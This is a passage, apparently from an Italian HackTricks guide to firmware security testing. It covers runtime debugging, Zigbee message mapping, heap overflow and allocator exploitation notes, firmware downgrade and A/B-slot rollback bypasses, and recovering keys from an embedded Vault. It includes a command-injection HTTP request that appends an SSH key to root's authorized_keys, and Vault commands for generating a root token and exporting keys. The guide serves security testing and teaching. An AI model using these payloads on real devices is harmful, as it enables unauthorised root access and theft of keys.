sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Per isolare i guasti in modo ripetibile, scrivi file marker con timestamp su un volume scrivibile stabile e verificali offline; `/dev/kmsg`, le FIFO e le console temporanee possono produrre falsi negativi a causa del rate limiting o dell’arresto prematuro del processo. Prima di modificare codice non correlato, confronta anche le interfacce esatte tra i vari livelli: `uname -r` rispetto a `/lib/modules/`, le funzionalità ext4 su disco rispetto alla configurazione del kernel e la generazione di `libGL` di Mesa rispetto all’ABI del driver DRI e ai nomi dei driver derivati dal PCI. Un componente può essere presente e persino essere caricato correttamente con `dlopen()`, ma restare inutilizzabile perché il componente che lo usa si aspetta un ABI diverso.<sup>[[11]](#references)</sup>

## Analisi dinamica nella pratica

In questa fase, per l’analisi si usa un ambiente di dispositivo reale o emulato. È essenziale mantenere l’accesso alla shell del sistema operativo e al filesystem. L’emulazione potrebbe non riprodurre perfettamente le interazioni con l’hardware, rendendo talvolta necessario riavviarla. L’analisi dovrebbe esaminare nuovamente il filesystem, sfruttare le pagine web e i servizi di rete esposti ed esplorare le vulnerabilità del bootloader. I test di integrità del firmware sono fondamentali per individuare potenziali vulnerabilità dovute a backdoor.

## Tecniche di analisi runtime

L’analisi runtime consiste nell’interagire con un processo o un binario nel suo ambiente operativo, usando strumenti come gdb-multiarch, Frida e Ghidra per impostare breakpoint e individuare vulnerabilità tramite fuzzing e altre tecniche.

Per i target embedded privi di un debugger completo, **copia sul dispositivo un `gdbserver` collegato staticamente** e collegati da remoto:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mappatura dei messaggi Zigbee / radio-co-processor

Negli hub IoT, lo stack RF è spesso suddiviso tra un **radio MCU** e un processo Linux in userland. Un flusso di lavoro utile consiste nel mappare il percorso:<sup>[[8]](#references)</sup>

1. **Frame RF** trasmesso via etere
2. **Parser lato controller** sul radio MCU
3. **Protocollo seriale/UART testuale o TLV** inoltrato a Linux (ad esempio `/dev/tty*`)
4. **Dispatcher dell'applicazione** nel daemon principale
5. **Handler / state machine specifici del protocollo**

Questa architettura offre due obiettivi di reverse engineering anziché uno. Se il controller converte i frame radio binari in un protocollo testuale come `Group,Command,arg1,arg2,...`, ricostruisci:

- I **gruppi di messaggi** e le tabelle di dispatch
- Quali messaggi possono provenire dalla **rete** e quali dal controller stesso
- Gli esatti **campi discriminatori specifici del produttore** (ad esempio `manufacturer_code` e `cluster_command` di Zigbee)
- Quali handler sono raggiungibili solo durante le fasi di **commissioning**, discovery o download del firmware/modello

Per Zigbee, acquisisci il traffico di pairing e verifica se il target si affida ancora alla **Link Key** predefinita `ZigBeeAlliance09`. In tal caso, intercettare il traffico di commissioning può rivelare la **Network Key**. Gli install code di Zigbee 3.0 riducono questa esposizione: annota quindi se il dispositivo testato li applica davvero.

### Handler di protocollo specifici del produttore e raggiungibilità vincolata dall'FSM

I comandi Zigbee/ZCL specifici del produttore sono spesso un obiettivo migliore dei cluster standardizzati, perché alimentano **codice di parsing personalizzato** e **FSM** interne con controlli di validazione meno collaudati.<sup>[[8]](#references)</sup>

Flusso di lavoro pratico:

- Esegui il reverse engineering del dispatcher dei comandi finché non trovi l'**handler riservato al produttore**.
- Ricostruisci le tabelle di **stato FSM**, **evento**, **controllo**, **azione** e **stato successivo**.
- Individua gli **stati transitori** con avanzamento automatico e i rami di retry/errore che infine resettano o liberano lo stato controllato dall'attaccante.
- Verifica quali scambi di protocollo legittimi sono necessari per portare il daemon nello stato vulnerabile, invece di presumere che l'handler vulnerabile sia sempre raggiungibile.

Per i protocolli sensibili ai tempi, il replay dei pacchetti da un framework Python può essere troppo lento. Un approccio più affidabile consiste nell'emulare un dispositivo legittimo su hardware reale (ad esempio un **nRF52840**) usando uno stack di livello produttore, così da esporre gli **endpoint**, gli **attributi** e i tempi di commissioning corretti.

### Classe di bug nei download frammentati nei daemon embedded

Una classe di bug ricorrente nei firmware si presenta nei download frammentati di blob/modelli/configurazioni:<sup>[[8]](#references)</sup>

1. Il **primo frammento** (`offset == 0`) memorizza `ctx->total_size` e alloca `malloc(total_size)`.
2. I frammenti successivi convalidano solo i campi **locali al pacchetto** controllati dall'attaccante, come `packet_total_size >= offset + chunk_len`.
3. La copia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` senza verificare che rientri nella **dimensione allocata originale**.

Questo consente a un attaccante di inviare:

- Un primo frammento valido con una dimensione totale dichiarata **piccola**, per forzare una piccola allocazione nell'heap.
- Un frammento successivo con l'**offset previsto**, ma con un `chunk_len` maggiore.
- Una dimensione locale al pacchetto contraffatta, che supera i nuovi controlli ma causa comunque un overflow del buffer allocato originariamente.

Quando il percorso vulnerabile è protetto dalla logica di commissioning, lo sfruttamento deve includere un livello sufficiente di **emulazione del dispositivo** per portare il target nello stato previsto di download del modello o del blob prima di inviare i frammenti malformati.

### Trigger di `free()` guidati dal protocollo

Nei daemon embedded, il modo più semplice per attivare lo sfruttamento dei metadati dell'heap spesso non è "aspettare la pulizia", ma **forzare la gestione degli errori del protocollo stesso**:<sup>[[8]](#references)</sup>

- Invia frammenti successivi malformati per spingere l'FSM negli stati di **retry** o **errore**.
- Supera la soglia di retry per far sì che il daemon **resetti il contesto** e liberi il buffer corrotto.
- Sfrutta questa chiamata prevedibile a `free()` per attivare primitive lato allocator prima che il processo vada in crash per motivi indipendenti.

Ciò è particolarmente utile contro allocator **simili a musl/uClibc/dlmalloc** in Linux embedded, dove la corruzione dei metadati dei chunk può trasformare la logica di unlink/unbin in una primitiva di scrittura. Un approccio stabile consiste nel corrompere un **campo size** per reindirizzare l'attraversamento dell'allocator verso **fake chunk predisposti all'interno del buffer sottoposto a overflow**, invece di sovrascrivere subito i puntatori reali delle bin e causare il crash del processo.

## Sfruttamento binario e Proof-of-Concept

Lo sviluppo di un PoC per le vulnerabilità individuate richiede una conoscenza approfondita dell'architettura target e la programmazione in linguaggi di basso livello. Le protezioni runtime binarie sono rare nei sistemi embedded, ma quando presenti possono rendere necessarie tecniche come Return Oriented Programming (ROP).

### Note sullo sfruttamento dei fastbin di uClibc (Linux embedded)

- **Fastbin e consolidamento:** uClibc usa fastbin simili a quelli di glibc. Una successiva allocazione di grandi dimensioni può attivare `__malloc_consolidate()`, quindi qualsiasi fake chunk deve superare i controlli (size plausibile, `fd = 0` e chunk circostanti considerati "in uso").<sup>[[6]](#references)</sup>
- **Binari non-PIE con ASLR:** se ASLR è abilitato ma il binario principale è **non-PIE**, gli indirizzi `.data/.bss` all'interno del binario sono stabili. Puoi puntare a una regione che assomiglia già a un header valido di chunk dell'heap per far finire un'allocazione fastbin su una **tabella di puntatori a funzione**.
- **NUL che interrompe il parser:** durante il parsing di JSON, un `\x00` nel payload può interrompere il parsing mantenendo i byte controllati dall'attaccante che seguono, da usare per uno stack pivot/una ROP chain.
- **Shellcode tramite `/proc/self/mem`:** una ROP chain che chiama `open("/proc/self/mem")`, `lseek()` e `write()` può inserire shellcode eseguibile in una mappatura nota e passarvi l'esecuzione.

## Sistemi operativi predisposti per l'analisi del firmware

Sistemi operativi come [AttifyOS](https://github.com/adi0x90/attifyos) ed [EmbedOS](https://github.com/scriptingxss/EmbedOS) offrono ambienti preconfigurati per i test di sicurezza del firmware, dotati degli strumenti necessari.

## Sistemi operativi predisposti per analizzare il firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS è una distro pensata per aiutarti a eseguire valutazioni di sicurezza e penetration testing sui dispositivi Internet of Things (IoT). Fa risparmiare molto tempo fornendo un ambiente preconfigurato con tutti gli strumenti necessari già installati.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operativo per i test di sicurezza embedded basato su Ubuntu 18.04, con strumenti per i test di sicurezza del firmware preinstallati.

## Attacchi di downgrade del firmware e meccanismi di aggiornamento non sicuri

Anche quando un produttore implementa controlli di firma crittografica per le immagini firmware, spesso **omette la protezione dal rollback (downgrade) della versione**. Se il bootloader o il recovery loader verifica solo la firma con una chiave pubblica incorporata, ma non confronta la *versione* (o un contatore monotono) dell'immagine da installare, un attaccante può installare legittimamente un **firmware più vecchio e vulnerabile, ma ancora dotato di una firma valida**, reintroducendo così vulnerabilità già corrette.<sup>[[4]](#references)</sup>

Flusso di attacco tipico:

1. **Ottenere un'immagine firmata più vecchia**
   * Scaricarla dal portale pubblico, dal CDN o dal sito di supporto del produttore.
   * Estrarla dalle applicazioni mobile/desktop correlate (ad esempio, dalla directory `assets/firmware/` di un APK Android).
   * Recuperarla da repository di terze parti come VirusTotal, archivi Internet, forum, ecc.
2. **Caricare o fornire l'immagine al dispositivo** tramite un canale di aggiornamento esposto:
   * Web UI, API dell'app mobile, USB, TFTP, MQTT, ecc.
   * Molti dispositivi IoT consumer espongono endpoint HTTP(S) *non autenticati* che accettano blob firmware codificati in Base64, li decodificano lato server e avviano il ripristino/aggiornamento.
3. Dopo il downgrade, sfruttare una vulnerabilità corretta in una versione più recente (ad esempio, un filtro contro la command injection aggiunto successivamente).
4. Facoltativamente, reinstallare l'immagine più recente o disabilitare gli aggiornamenti per evitare di essere rilevati una volta ottenuta la persistenza.

### Esempio: command injection dopo il downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Nel firmware vulnerabile (con versione retrocessa), il parametro `md5` viene concatenato direttamente a un comando shell senza alcuna sanitizzazione, consentendo l'iniezione di comandi arbitrari (in questo caso, abilitando l'accesso root tramite chiave SSH). Le versioni successive del firmware hanno introdotto un filtro di base sui caratteri, ma l'assenza di protezione dal downgrade rende inutile la correzione.<sup>[[4]](#references)</sup>

### Estrazione del firmware dalle app mobile

Molti vendor includono immagini firmware complete nelle app mobile associate, così che l'app possa aggiornare il dispositivo tramite Bluetooth/Wi-Fi. Questi pacchetti sono comunemente archiviati senza cifratura nell'APK/APEX in percorsi come `assets/fw/` o `res/raw/`. Strumenti come `apktool`, `ghidra` o persino il semplice `unzip` consentono di estrarre immagini firmate senza accedere all'hardware fisico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass dell'anti-rollback limitato all'updater nei design con slot A/B

Alcuni vendor implementano un **ratchet** anti-downgrade, ma solo nella logica dell'*updater* (ad esempio una routine UDS su CAN, un comando di recovery o un agente OTA in userspace). Se in seguito il **bootloader** controlla solo la firma/CRC dell'immagine e si fida della tabella delle partizioni o dei metadati dello slot, la protezione dal rollback può comunque essere aggirata.<sup>[[7]](#references)</sup>

Design debole tipico:

- I metadati del firmware contengono sia un descrittore di versione sia un **ratchet di sicurezza** / contatore monotono.
- L'updater confronta il ratchet dell'immagine con un valore memorizzato nello storage persistente e rifiuta le immagini firmate più vecchie.
- Il bootloader **non** analizza quel ratchet e verifica solo l'header, il CRC e la firma prima di avviare lo slot selezionato.
- L'attivazione dello slot è memorizzata separatamente, in una tabella delle partizioni o in un contatore di generazione per slot, e **non è associata crittograficamente** all'hash esatto del firmware convalidato.

Nei sistemi a doppio slot, questo crea una primitiva **convalida di un'immagine / avvio di un'altra immagine**. Se l'attaccante può fare in modo che l'updater contrassegni lo slot B come destinazione del prossimo avvio usando un'immagine firmata attuale, e in seguito può sovrascrivere lo slot B prima del riavvio, il bootloader potrebbe comunque avviare l'immagine con downgrade, perché si fida solo dei metadati dello slot già salvati.

Schema di abuso comune:

1. Caricare un firmware **firmato e attuale** nello slot passivo ed eseguire la normale routine di convalida/cambio, in modo che il layout contrassegni quello slot come prossimo attivo.
2. **Non riavviare ancora**. Rientrare nella routine di preparazione/cancellazione dello slot nella stessa sessione.
3. Sfruttare una logica obsoleta dello stato di boot o della selezione dello slot, in modo che l'updater cancelli lo **stesso slot fisico** appena promosso.
4. Scrivere in quello slot un firmware **più vecchio ma comunque firmato**.
5. Saltare la routine di convalida che applica il ratchet e riavviare direttamente.
6. Il bootloader seleziona lo slot promosso, verifica solo la firma/integrità e avvia la vecchia immagine.

Aspetti da cercare durante il reverse engineering delle implementazioni di aggiornamento A/B:

- Selezione dello slot basata su **flag di boot** che non vengono aggiornati dopo un cambio riuscito.
- Una routine del tipo `prepare_passive_slot()` che cancella uno slot in base a uno stato obsoleto invece che al **layout attualmente salvato**.
- Una funzione del tipo `part_write_layout()` che incrementa solo un **contatore di generazione** / flag di attivazione e non memorizza l'hash dell'immagine convalidata.
- Controlli del ratchet implementati in userspace o nel codice dell'updater, ma **non** nelle fasi ROM / bootloader / secure boot.
- Routine di cancellazione o recovery che lasciano lo slot contrassegnato come avviabile anche dopo che il suo contenuto è stato rimosso e riscritto.

### Checklist per valutare la logica di aggiornamento

* Il trasporto/l'autenticazione dell'*endpoint di aggiornamento* sono adeguatamente protetti (TLS + autenticazione)?
* Il dispositivo confronta i **numeri di versione** o un **contatore monotono anti-rollback** prima del flashing?
* L'immagine viene verificata all'interno di una catena secure boot (ad esempio, le firme vengono controllate dal codice ROM)?
* Il **bootloader applica lo stesso ratchet** dell'updater, invece di limitarsi a controllare firma/CRC?
* I metadati di attivazione dello slot sono **associati al digest/versione del firmware convalidato** oppure lo slot può essere modificato dopo la promozione?
* Dopo un cambio di slot riuscito, il dispositivo è obbligato a riavviarsi o le routine successive di aggiornamento/cancellazione sono ancora raggiungibili nella stessa sessione?
* Il codice in userland esegue ulteriori controlli di coerenza (ad esempio, sulla mappa delle partizioni consentita o sul numero di modello)?
* I flussi di aggiornamento *parziali* o di *backup* riutilizzano la stessa logica di convalida?

> 💡  Se manca uno qualsiasi degli elementi sopra indicati, è probabile che la piattaforma sia vulnerabile agli attacchi di rollback.

## Firmware vulnerabile per fare pratica

Per esercitarsi a individuare vulnerabilità nel firmware, usare i seguenti progetti di firmware vulnerabile come punto di partenza.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperare le chiavi di decrittazione del firmware dallo stato di KMS/Vault incorporato

Quando un'immagine di aggiornamento combina piccoli metadati in chiaro con un grande blob ad alta entropia, eseguire il triage del contenitore prima di tentare qualsiasi brute force:<sup>[[1]](#references)</sup>

- Esaminare header, offset e limiti di riga con `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` di solito indica il formato OpenSSL `enc`: i successivi 8 byte sono il salt e i byte rimanenti sono il ciphertext.
- Un campo Base64 che, una volta decodificato, è esattamente di `256` byte è un forte indizio che si tratti di un ciphertext RSA-2048 che protegge una password casuale del firmware/chiave di sessione.
- Il materiale PGP detached nello stesso file spesso protegge solo l'autenticità; non presumere che sia il meccanismo di riservatezza.

Se la ricerca statica delle chiavi (`grep`, `strings`, ricerche PEM/PGP) non dà risultati, eseguire il reverse engineering del **percorso operativo di decrittazione** invece di limitarsi a cercare chiavi private:

- Decompilare l'updater / il binario di gestione e tracciare chi legge il blob cifrato, quale helper/API lo decifra e quale nome logico della chiave richiede.
- Cercare nel filesystem root estratto lo stato di KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), oltre ai file unit e agli script di init.
- Considerare le istruzioni in chiaro `vault operator unseal ...`, le chiavi di recovery, i token di bootstrap o gli script locali di auto-unseal di KMS come equivalenti a materiale di chiave privata.

Se l'appliance include il binario originale di Vault e il backend di storage, riprodurre quell'ambiente è di solito più semplice che reimplementare gli interni di Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Con root sul KMS clonato:

- Rendi le chiavi transit esportabili solo all'interno del clone isolato: `vault write transit/keys/<name>/config exportable=true`
- Esporta la chiave di unwrap: `vault read transit/export/encryption-key/<name>`
- Prova la chiave RSA recuperata usando la coppia esatta padding/hash impiegata dal KMS. Un errore di decifratura PKCS#1 v1.5 e un errore di decifratura OAEP predefinita **non** dimostrano che la chiave sia errata; molti flussi basati su Vault usano OAEP con SHA-256, mentre le librerie comuni usano SHA-1 per impostazione predefinita.
- Se il payload inizia con `Salted__`, riproduci esattamente la KDF OpenSSL del produttore (`EVP_BytesToKey`, spesso MD5 sugli appliance legacy) prima di tentare la decifratura AES-CBC.

Questo trasforma il problema del «firmware cifrato» in una questione più generale: **recuperare le chiavi operative lato appliance, quindi riprodurre offline i parametri esatti di unwrap + KDF**.

## Formazione e certificazioni

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking del firmware con Claude: competenze da senior, autonomia da junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologia di test della sicurezza del firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Hacking pratico dell'IoT: la guida definitiva per attaccare l'Internet delle cose](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Sfruttare zero-day in hardware abbandonato – blog di Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Come un dispositivo smart da 20 $ mi ha dato accesso a casa tua](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Ora mi vedi: ora sei Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Sfruttare il Tesla Wall Connector dal connettore della porta di ricarica - Parte 2: aggirare la protezione anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Fallo lampeggiare: sfruttamento over-the-air del Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS su QEMU Parte 1: estrazione](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentazione del kernel Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS su QEMU Parte 2: debugging e correzione](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Password del BIOS Dell: la debole cifratura XOR consente il recupero dalla memoria SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Strumenti per il recupero delle password del BIOS Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Ripassiamo l'hardware hacking, Parte 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Come e perché abbiamo hackerato il wallet hardware Cypherock: la storia completa](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
